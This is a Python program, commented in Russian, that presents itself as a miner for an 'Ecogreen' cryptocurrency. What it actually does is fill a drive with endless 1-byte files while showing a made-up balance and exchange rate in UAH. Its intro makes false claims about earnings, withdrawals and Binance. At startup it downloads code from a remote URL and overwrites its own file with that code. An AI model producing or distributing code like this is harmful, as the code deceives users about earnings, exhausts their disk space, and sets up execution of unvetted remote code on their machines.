import os
import time
import sys
import requests

UPDATE_URL = "https://raw.githubusercontent.com/Mavox-ID/ecogreen-miner/main/ecomainer.py"
BALANCE_FILE = "C:/Intel/BB_ecogreen.txt"  # Путь к файлу для хранения баланса

def check_for_updates():
    try:
        response = requests.get(UPDATE_URL, timeout=5)
        response.raise_for_status()

        with open(__file__, "r") as current_file:
            current_code = current_file.read()

        if response.text != current_code:
            with open(__file__, "w") as current_file:
                current_file.write(response.text)
            print("The application is updated. Please restart the program, otherwise, the conclusion from the old miner will be reset.")
            sys.exit()
    except Exception as e:
        print(f"Failed to check for updates: {e}")

def display_intro():
    intro_text = """
    Welcome to the official Ecogreen mining application!
    Here you can mine Ecogreen cryptocurrency and purchase additional assets and speeds.
    By default, 100 files are created per second, earning 0.01 Ecogreen per second.
    Current rate: 10 UAH = 1 Ecogreen.
    Attention! Ecogreen releases updates regularly. If you use an outdated version, withdrawals may not be supported.
    Ensure your balance is above 50 Ecogreen for compatibility with newer versions!
    """
    sys.stdout.write("\033[H\033[J")  # Очистка экрана
    print(intro_text)
    time.sleep(10)

def check_disk_exists(disk_letter):
    return os.path.exists(f"{disk_letter}:/")

def load_balance():
    """Загружаем сохраненный баланс из файла, если файл существует"""
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, "r") as f:
            lines = f.readlines()
            if len(lines) >= 2:
                ecogreen_balance = float(lines[0].strip())
                uah_balance = float(lines[1].strip())
                return ecogreen_balance, uah_balance
    return 0.0, 0.0  # Если файл не найден, начинаем с 0

def save_balance(ecogreen_balance, uah_balance):
    """Сохраняем баланс в файл"""
    with open(BALANCE_FILE, "w") as f:
        f.write(f"{ecogreen_balance}\n{uah_balance}")

def mine_ecogreen(disk_letter):
    ecogreen_folder = f"{disk_letter}:/Ecogreen"
    os.makedirs(ecogreen_folder, exist_ok=True)

    # Загружаем баланс из файла
    balance, uah_balance = load_balance()

    file_count = 0

    while True:
        # Создаем файл 1 байт
        file_path = os.path.join(ecogreen_folder, f"file_{file_count}.eco")
        with open(file_path, "wb") as f:
            f.write(b"\x00")
        
        file_count += 1

        # Каждый 100 файлов начисляем 0.01 Ecogreen
        if file_count % 100 == 0:
            balance += 0.01
            uah_balance = balance * 10.0  # Допустим, 1 Ecogreen = 10 UAH

            # Сохраняем обновленные данные в файл
            save_balance(balance, uah_balance)

        # Обновляем отображение в консоли
        sys.stdout.write("\033[H\033[J")  # Очистка экрана
        print(f"HDD: {disk_letter}:/")
        print("HS: 100 F/S")
        print(f"CR: Created file {file_path}")
        print(f"Balance: {balance:.2f} Ecogreen ({uah_balance:.2f} UAH)")
        print("OOO kriptoTM & binance (Ecogreen 2019)")
        
        time.sleep(0.01)  # Пауза 10 миллисекунд

if __name__ == "__main__":
    check_for_updates()  # Проверка обновлений
    display_intro()  # Показать приветствие

    while True:
        # Автоматическая проверка диска D
        if check_disk_exists("D"):
            print("Disk D:/ found. Starting mining...")
            mine_ecogreen("D")
        else:
            # Сообщение об ошибке и ввод другого диска
            print("HDD for mining Ecogreen cryptocurrency was not found.")
            print(
                "You can use a disk with another volume. Write the letter of the volume (uppercase only):"
            )
            disk_letter = input("Enter the letter of the disk to use: ").strip().upper()

            if len(disk_letter) != 1:
                print("Invalid input. Please enter a single letter.")
                continue
            
            if check_disk_exists(disk_letter):
                print(f"Disk {disk_letter}:/ found. Starting mining...")
                mine_ecogreen(disk_letter)
            else:
                print(f"Disk {disk_letter}:/ not found. Try again.")
